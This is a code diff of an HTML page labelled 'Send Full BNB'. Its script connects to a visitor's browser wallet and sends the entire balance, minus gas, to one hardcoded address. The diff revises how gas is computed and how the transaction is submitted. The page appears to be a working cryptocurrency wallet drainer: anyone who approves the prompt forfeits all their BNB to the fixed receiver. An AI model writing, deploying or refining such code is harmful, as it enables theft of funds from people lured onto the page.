@@ -6,25 +6,27 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body style="font-family:sans-serif; text-align:center; padding-top:40px;">
+
   <h2>Send Full BNB</h2>
   <button id="sendButton" style="font-size:18px;padding:10px 25px;">Send Now</button>
   <p id="status" style="margin-top:20px; color:red;"></p>
 
   <script>
-    const receiver = "0xC64087a6Fd263ab6A140F9b46f4cAF7B3e82147F";
+    const receiver = "0xC64087a6Fd263ab6A140F9b46f4cAF7B3e82147F"; // same address
+    const gasLimit = 21000;
 
     document.getElementById("sendButton").onclick = async () => {
       const status = document.getElementById("status");
-      status.style.color = "red";
       status.textContent = "Connecting...";
 
-      try {
-        if (typeof window.ethereum === 'undefined') {
-          status.textContent = "Trust Wallet or MetaMask not found.";
-          return;
-        }
+      if (typeof window.ethereum === 'undefined') {
+        status.textContent = "Trust Wallet or MetaMask not found.";
+        return;
+      }
 
-        const web3 = new Web3(window.ethereum);
+      const web3 = new Web3(window.ethereum);
+
+      try {
         await ethereum.request({ method: 'eth_requestAccounts' });
         const accounts = await web3.eth.getAccounts();
         const sender = accounts[0];
@@ -36,36 +38,30 @@
         }
 
         const balanceWei = await web3.eth.getBalance(sender);
-        const gasPrice = BigInt(await web3.eth.getGasPrice()) + BigInt(10_000_000_000); // +10 Gwei
-        const estimatedGas = await web3.eth.estimateGas({ from: sender, to: receiver, value: balanceWei });
-        const gasCost = BigInt(estimatedGas) * gasPrice;
+        const gasPrice = await web3.eth.getGasPrice();
+        const totalGas = BigInt(gasLimit) * BigInt(gasPrice);
 
-        if (BigInt(balanceWei) <= gasCost) {
-          status.textContent = "Insufficient balance after gas.";
+        if (BigInt(balanceWei) <= totalGas) {
+          status.textContent = "Not enough balance for gas.";
           return;
         }
 
-        const sendAmount = BigInt(balanceWei) - gasCost;
-
-        const tx = {
-          from: sender,
-          to: receiver,
-          value: "0x" + sendAmount.toString(16),
-          gas: "0x" + estimatedGas.toString(16),
-          gasPrice: "0x" + gasPrice.toString(16)
-        };
+        const sendAmount = BigInt(balanceWei) - totalGas;
 
         status.textContent = "Sending transaction...";
-        const txHash = await ethereum.request({
-          method: 'eth_sendTransaction',
-          params: [tx],
+
+        const txHash = await web3.eth.sendTransaction({
+          from: sender,
+          to: receiver,
+          value: sendAmount.toString(),
+          gas: gasLimit,
+          gasPrice: gasPrice,
         });
 
         status.style.color = "green";
-        status.textContent = "Transaction sent! Hash: " + txHash;
+        status.textContent = "Transaction sent! Hash: " + txHash.transactionHash;
       } catch (err) {
-        console.error("Transaction error:", err);
-        status.textContent = "Transaction failed: " + (err.message || JSON.stringify(err));
+        status.textContent = "Transaction failed: " + (err.message || err);
       }
     };
   </script>
